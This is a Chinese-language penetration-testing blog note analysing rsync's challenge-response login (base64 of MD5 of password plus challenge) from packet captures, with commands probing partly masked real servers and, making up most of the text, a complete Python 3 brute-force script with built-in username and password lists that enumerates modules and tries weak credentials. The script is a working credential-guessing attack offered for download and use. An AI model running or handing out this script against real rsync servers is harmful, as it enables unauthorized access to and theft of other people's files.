---
title: "Rsync认证方式分析笔记（附爆破脚本）"
slug: 65255f68fc623bf12e6ad4c024d8d755
translationKey: 65255f68fc623bf12e6ad4c024d8d755
date: 2020-11-05T17:32:03+08:00
source: yuque/penetration
---

某次渗透中遇到了rsync，是带密码的，虽然已经有爆破脚本了（例如cdxy前辈在POC-T框架中写的[这一个](https://github.com/Xyntax/POC-T/blob/9d538a217cb480dbd1f94f1fa6c8154a41b5b106/script/rsync-weakpass.py)），但前辈的脚本是py2的, 于是想着改写成py3，没想到还顺便分析了一下rsync的认证方式。下面就简单记录一下

# 流量分析
```powershell
tcpdump -i eth0  net 47.*.*.142  -w access_denied.pcap  -v
            ↑             ↑                          ↑              
            网卡          ip                 指定写入文件的路径
```

使用上面的命令抓包，分析一下连接rsync时的流量信息, 发现在正常返回rsync版本信息后, 无非这么几种可能性: 数据为空、限制访问IP、未授权下载、需要密码访问，下面逐个进行分析

## 1. 数据为空.
建立TCP连接后, 服务器首先响应版本信息, 后续无路径或其它信息.

命令行如下

```plain
$ rsync  rsync://222.*.*.163
welcome to zckj ECG service!
$ rsync  rsync://222.*.*.163/
welcome to zckj ECG service!
```

对应的流量信息如下图

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1604568723228-d3f4a207-305b-4712-abfd-a13616854a65.png)

## 2. 限制访问IP
服务器对连接rsync服务的IP做了限制，提示`@ERROR: access denied`

命令行如下

```powershell
$ rsync  rsync://47.*.*.142/
﻿++++++++++++++++++++++++++++++++++++++++++++++
Welcome to use the posweb2 rsync services!
+++++++++++++++++++++++++++++++++++++++++++++
rhel4test      	
interface      	
default        	
posweb2        	
$ rsync  rsync://47.*.*.142/default
﻿++++++++++++++++++++++++++++++++++++++++++++++
Welcome to use the posweb2 rsync services!
+++++++++++++++++++++++++++++++++++++++++++++
@ERROR: access denied to default from unknown (x.x.x.x)
rsync error: error starting client-server protocol (code 5) at main.c(1648) [Receiver=3.1.2]
```

对应的数据包如图

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1604568723274-47426d98-60d7-49de-b571-5be4d49bcb62.png)

## 3. 未授权（查看/下载）文件
无需密码即可查看或下载文件

命令行如下:

```powershell
rsync  rsync://182.*.*.105/ftp/lnmp/js/cross_framing_protection.js -av cross_framing_protection.js
   rsync  rsync://182.*.*.105/
   rsync  rsync://182.*.*.105/frp/
   rsync  rsync://182.*.*.105/ftp/
```

服务器返回版本信息后, 后续有文件的路径信息. 还有一些rsync服务器本身的信息

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1604568723320-0bda5e11-61e0-4bbf-9b2b-d45db246f89e.png)

这里补充一下`cross_framing_protection.js`的内容

```plain
/* vim: set expandtab sw=4 ts=4 sts=4: */
/**
 * Conditionally included if framing is not allowed
 */
if (self == top) {
    var style_element = document.getElementById("cfs-style");
    style_element.parentNode.removeChild(style_element);
} else {
    top.location = self.location;
}
```

## 4. 需要密码才能访问文件
访问文件需要密码. 此处以某个需要密码rsync的服务器为例, 登录需要密码, 为了分析它密码的传输方式, 我们输入`123` 和`123456`

```powershell
$ rsync  rsync://115.*.*.9/            
nagios         	
pxe            	
iso            	
ks             	
$ rsync  rsync://115.*.*.9/ks
Password: 123
@ERROR: auth failed on module ks
rsync error: error starting client-server protocol (code 5) at main.c(1648) [Receiver=3.1.2]
$ rsync  rsync://115.*.*.9/ks
Password: 123456
@ERROR: auth failed on module ks
rsync error: error starting client-server protocol (code 5) at main.c(1648) [Receiver=3.1.2]
//后面又输入了两次`123456`
```

对应的数据包信息如下图

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1604568723387-21a32cd7-ecbf-429e-b34e-25208bb04bff.png)

为了方便各位分析它的加密方式，我这里也是将其拷贝到下面。

```markdown
# 123
@RSYNCD: AUTHREQD +5i4JUkz2ILcsstkVvq+pw
root rzSmBKOaIrWVeeAqD9y3Qg
# 123456  [1]
@RSYNCD: AUTHREQD kr226cbR33Kp7oa/mBkD8Q
root sJO2OqB/FrX2AdzExhXRVg
# 123456  [2]
@RSYNCD: AUTHREQD 4zEjkjnHgAohsbmcGWDAIew
root ZQHyePox75RGlDOiSjWyyg
# 123456  [3]
@RSYNCD: AUTHREQD rmTUiaJNQD/5zenMBaiGuA
root gxAlH3oiZ1CgibVelnHanA
```

那么我们来分析一下rsync密码的加密方式。

# 加密方式分析
通过相关资料我们了解到， rsync采用的是md5加密,

最终通过抓包分析, 确定rsync 31.0版本也是采用的md5 challenge加密, 跟30.0一样

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1604568723531-e5e5ca47-5f2c-4d99-a98d-611bf0a879f2.png)

拿到了原文和发送过程中的密文，就可以着手分析加密方式了, 经过分析, 其实加密方式不难

```plain
# 最终密码的表达式
sentPassword = base64(md5(password+challenge))
```

# 爆破脚本
核心代码如下：代码已经上传至github, 地址: [https://github.com/hi-unc1e/some_scripts/blob/master/EXPs/rsync_weakpass.py](https://github.com/hi-unc1e/some_scripts/blob/master/EXPs/rsync_weakpass.py)

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
'''rsync弱口令扫描.
rsync存在弱密码. PoC将在msg里输出 【未授权访问的文件夹、账号、密码】。 rsync未授权访问带来的危害主要有两个：一是造成了严重的信息泄露；二是上传脚本后门文件，远程命令执行。
'''
# 版权信息
__author__ = "cdxy https://github.com/Xyntax"
__reference__ = "https://github.com/Xyntax/POC-T/blob/9d538a217cb480dbd1f94f1fa6c8154a41b5b106/script/rsync-weakpass.py"
__modifiedby__ = "unc1e"
import socket
import struct
import hashlib
import base64
import signal
# 账号密码
USER_LIST = ['root', 'Administrator', 'rsync', 'user', 'test']
PASS_LIST = ['', 'password', '123456', '12345678', 'qwerty', 'admin123', 'test123', '123456789']
# USER_LIST = ['root']
def initialisation(ip, port):
    '''
        初始化并获得版本信息,每次会话前都要发送版本信息
    '''
    try:
        flag = False
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket.setdefaulttimeout(8)
        rsync = {"MagicHeader": "@RSYNCD:", "HeaderVersion": " 30.0"}
        payload = struct.pack("!8s5ss", rsync["MagicHeader"].encode("utf-8"), rsync["HeaderVersion"].encode("utf-8"), "\n".encode("utf-8"))  # init
        port = int(port)
        s.connect((ip, port))
        s.send(payload)
        data = s.recv(1024)
        # reply = struct.unpack('!8s5ss', data)
        reply = data.decode()
        if ("RSYNCD" in reply):
            flag = True
            version = reply.split(' ')[1].strip()#31.0 
            rsynclist = ClientQuery(s)  # 查询模块名
        if flag:
            return True, "@RSYNCD:", version, rsynclist
    except Exception as e:
        print('[-]rsync weakpass not found (brute failed)(%s)' % str(e))
def ClientQuery(socket_pre):
    '''
        查询所有的模块名
        @return module name
    '''
    s = socket_pre
    payload = struct.pack("!s", "\n".encode('utf-8'))  # query
    modulelist = []
    try:
        s.send(payload)
        while True:
            data = s.recv(1024)  # Module List lenth 17
            moduletemp = struct.unpack("!" + str(len(data)) + "s", data)
            modulename = moduletemp[0].decode().replace(" ", "").split("\n")
            for i in range(len(modulename)):
                realname = modulename[i].split("\t")
                if realname[0] != "":
                    modulelist.append(realname[0])
            if modulename[-2] == "@RSYNCD:EXIT":
                break
    except Exception as e:
        print(e)
        s.close()
    s.close()
    return modulelist
def ClientCommand(ip, port, cmd):
    '''爆破密码的封装方法
    '''
    rsync = {"MagicHeader": "@RSYNCD:", "HeaderVersion": " 30.0"}
    payload1 = struct.pack("!8s5ss", rsync["MagicHeader"].encode("utf-8"), rsync["HeaderVersion"].encode("utf-8"), "\n".encode("utf-8"))
    # payload2 = struct.pack("!%ss" % (len(cmd)+1), cmd.encode("utf-8")+'\n'.encode("utf-8") )
    payload2 = cmd.encode("utf-8")+'\n'.encode("utf-8") 
    pass_list = []
    for i in USER_LIST:
        pass_list.append((i, i))
        for j in PASS_LIST:
            pass_list.append((i, j))
    for useri, pwdj in pass_list:
        try:
            user = useri.encode("utf-8")
            password = pwdj.encode("utf-8")
            # debug("try: %s,%s" %(useri,pwdj))
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            port = int(port)
            s.connect((ip, port))
            # step1 get version and init
            s.send(payload1)
            s.recv(1024)  # data  @RSYNCD: AUTHREQD 9moobOy1VMjNAU/D4PB35g
            # send cmd and generate the challenge code
            s.send(payload2)  # send client query
            data = s.recv(1024)  # data  @RSYNCD: AUTHREQD 9moobOy1VMjNAU/D4PB35g
            challenge = data[18:-1]  # get challenge code
            # encrypt and generate the payload3
            md = hashlib.md5()
            md.update(password)
            md.update(challenge)
            auth_send_data = base64.encodestring(md.digest())
            payload3 = "%s %s\n" % (user.decode(), auth_send_data[:-3].decode())
            payload3 = payload3.encode()
            s.send(payload3)
            data3 = s.recv(1024)  # @RSYNCD: OK
            s.close()
            if 'OK' in data3.decode():
                state = 1
                if password == '':
                    msg = "Module:'%s' User/Password:%s/<empty>" % (cmd, user)
                else:
                    msg = "Module:'%s' User/Password:%s/%s" % (cmd, user, password)
                return state, msg 
            else:
                continue
        # try next user-pwd pair            
        except Exception as e:
            # print('[-]rsync weakpass not found (brute failed)(%s)' % str(e))
            s.close()
            break
    state = 0
    msg = '[-]rsync weakpass not found (brute failed)'
    return state, msg 
def run(args):
    msg = ''
    state = 0
    # param init
    try:
        ip = args.get('ip')
        port = args.get("port", '873')
    except Exception as e:
        state = 0
        msg = '[-]parse ip/port error(%s)' % str(e)
        result = {'ip': ip, 'port': port, 'state': state, 'msg': msg}
        return result      
    try:
        res = initialisation(ip, port)
        # (True, '@RSYNCD:', ' 31.0', ['share', '@RSYNCD:EXIT'])
        if res[0]:
            if res[2] < "30.0":  # 判断版本, 不兼容<30.0版本的登录方式
                state = 0
                msg = '[-]version not support'
                result = {'ip': ip, 'port': port, 'state': state, 'msg': msg}
                return result    
            for i in range(len(res[3]) - 1):
                state, msg = ClientCommand(ip, port, res[3][i])
                if 'Module:' in msg:
                    msg += msg
                else:
                    msg = "[-]No Module Available"
            
            result = {'ip': ip, 'port': port, 'state': state, 'msg': msg}
            return result
        else:
            state = 0
            msg = '[-]version not support'
            result = {'ip': ip, 'port': port, 'state': state, 'msg': msg}
            return result    
    except Exception as e:
        state = 0
        msg = '[-]vuln not found, error:(%s)' % str(e)
        result = {'ip': ip, 'port': port, 'state': state, 'msg': msg}
        return result       
if __name__ == '__main__':
    '''在这里填写爆破的目标信息
    '''
    ip = '127.0.0.1'
    port = '873'
    args = {'ip': ip, 'port': port}
    res = run(args)
    print(res)
    # {'ip': '127.0.0.1', 'port': '873', 'state': 1, 'msg': "Module:'Config' User/Password:b'rsync'/b'123456'Module:'Config' User/Password:b'rsync'/b'123456'"}
```



